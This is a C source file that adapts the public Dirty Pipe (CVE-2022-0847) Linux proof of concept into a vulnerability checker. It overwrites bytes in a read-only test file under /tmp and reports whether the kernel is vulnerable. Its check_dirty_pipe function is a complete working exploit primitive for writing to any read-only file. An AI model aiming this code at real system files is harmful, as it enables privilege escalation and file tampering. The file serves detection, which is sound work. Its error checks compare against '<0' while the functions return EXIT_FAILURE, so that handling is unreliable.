/* SPDX-License-Identifier: GPL-2.0 */
/*
 * Copyright 2022 CM4all GmbH / IONOS SE
 *
 * Original Author: Max Kellermann <max.kellermann@ionos.com>
 * Modification: Simone Lazzaris <slazzaris@gmail.com>
 * 
 * Proof-of-concept exploit for the Dirty Pipe
 * vulnerability (CVE-2022-0847) caused by an uninitialized
 * "pipe_buffer.flags" variable.  It demonstrates how to overwrite any
 * file contents in the page cache, even if the file is not permitted
 * to be written, immutable or on a read-only mount.
 *
 * This exploit requires Linux 5.8 or later; the code path was made
 * reachable by commit f6dd975583bd ("pipe: merge
 * anon_pipe_buf*_ops").  The commit did not introduce the bug, it was
 * there before, it just provided an easy way to exploit it.
 *
 * There are two major limitations of this exploit: the offset cannot
 * be on a page boundary (it needs to write one byte before the offset
 * to add a reference to this page to the pipe), and the write cannot
 * cross a page boundary.
 *
 * Further explanation: https://dirtypipe.cm4all.com/
 * 
 * Instructions: Just compile and run the binary
 * 
 */

#define _GNU_SOURCE
#include <unistd.h>
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/stat.h>
#include <sys/user.h>

#ifndef PAGE_SIZE
#define PAGE_SIZE 4096
#endif

/**
 * Create a pipe where all "bufs" on the pipe_inode_info ring have the
 * PIPE_BUF_FLAG_CAN_MERGE flag set.
 */
static void prepare_pipe(int p[2])
{
	if (pipe(p)) abort();

	const unsigned pipe_size = fcntl(p[1], F_GETPIPE_SZ);
	static char buffer[4096];

	/* fill the pipe completely; each pipe_buffer will now have
	   the PIPE_BUF_FLAG_CAN_MERGE flag */
	for (unsigned r = pipe_size; r > 0;) {
		unsigned n = r > sizeof(buffer) ? sizeof(buffer) : r;
		write(p[1], buffer, n);
		r -= n;
	}

	/* drain the pipe, freeing all pipe_buffer instances (but
	   leaving the flags initialized) */
	for (unsigned r = pipe_size; r > 0;) {
		unsigned n = r > sizeof(buffer) ? sizeof(buffer) : r;
		read(p[0], buffer, n);
		r -= n;
	}

	/* the pipe is now empty, and if somebody adds a new
	   pipe_buffer without initializing its "flags", the buffer
	   will be mergeable */
}

static int check_dirty_pipe(const char *const path, loff_t offset, const char *const data)
{
	const size_t data_size = strlen(data);

	if (offset % PAGE_SIZE == 0) {
		fprintf(stderr, "Sorry, cannot start writing at a page boundary\n");
		return EXIT_FAILURE;
	}

	const loff_t next_page = (offset | (PAGE_SIZE - 1)) + 1;
	const loff_t end_offset = offset + (loff_t)data_size;
	if (end_offset > next_page) {
		fprintf(stderr, "Sorry, cannot write across a page boundary\n");
		return EXIT_FAILURE;
	}

	/* open the input file and validate the specified offset */
	const int fd = open(path, O_RDONLY); // yes, read-only! :-)
	if (fd < 0) {
		perror("open failed");
		return EXIT_FAILURE;
	}

	struct stat st;
	if (fstat(fd, &st)) {
		perror("stat failed");
		return EXIT_FAILURE;
	}

	if (offset > st.st_size) {
		fprintf(stderr, "Offset is not inside the file\n");
		return EXIT_FAILURE;
	}

	if (end_offset > st.st_size) {
		fprintf(stderr, "Sorry, cannot enlarge the file\n");
		return EXIT_FAILURE;
	}

	/* create the pipe with all flags initialized with
	   PIPE_BUF_FLAG_CAN_MERGE */
	int p[2];
	prepare_pipe(p);

	/* splice one byte from before the specified offset into the
	   pipe; this will add a reference to the page cache, but
	   since copy_page_to_iter_pipe() does not initialize the
	   "flags", PIPE_BUF_FLAG_CAN_MERGE is still set */
	--offset;
	ssize_t nbytes = splice(fd, &offset, p[1], NULL, 1, 0);
	if (nbytes < 0) {
		perror("splice failed");
		return EXIT_FAILURE;
	}
	if (nbytes == 0) {
		fprintf(stderr, "short splice\n");
		return EXIT_FAILURE;
	}

	/* the following write will not create a new pipe_buffer, but
	   will instead write into the page cache, because of the
	   PIPE_BUF_FLAG_CAN_MERGE flag */
	nbytes = write(p[1], data, data_size);
	if (nbytes < 0) {
		perror("write failed");
		return EXIT_FAILURE;
	}
	if ((size_t)nbytes < data_size) {
		fprintf(stderr, "short write\n");
		return EXIT_FAILURE;
	}

	return EXIT_SUCCESS;
}

const char *const test_string="Hello World!\n";
const char *const test_file="/tmp/testfile.txt";

static int create_test_file(const char *const path) {
	int fd=open(path, O_CREAT|O_WRONLY, 0444);
	if (fd<0) {
		perror("testfile open failed");
		return EXIT_FAILURE;
	}
	if (write(fd, test_string, strlen(test_string))<0) {
		perror("testfile write failed");
		return EXIT_FAILURE;
	}
	close(fd);
	return 0;
}
static int check_file_content(const char *const path) {
	char buf[256];
	int fd=open(path, O_RDONLY);
	if (fd<0) {
		perror("testfile read failed");
		return -1;
	}
	int r=read(fd,buf,255);
	close(fd);
	int l=strlen(test_string);
	if (r!=l || strncmp(test_string,buf,l)!=0)
		return 1;
	return 0;
}
int main(int argc, char ** argv) {
	if (create_test_file(test_file)<0) {
		return EXIT_FAILURE;
	}
	/* dumb command-line argument parser */
	const char *const path = test_file;
	loff_t offset = 6;
	const char *const data = "mammy";
	if (check_dirty_pipe(path, offset, data)<0) {
		return EXIT_FAILURE;
	}
	int ret=check_file_content(test_file);
	switch(ret) {
		case -1:
			return EXIT_FAILURE;
		case 0:
			printf("You are safe\n");
			break;
		case 1:
			printf("VULNERABLE!\n");
			break;
	}
	unlink("/tmp/testfile.txt");
	return 0;
}
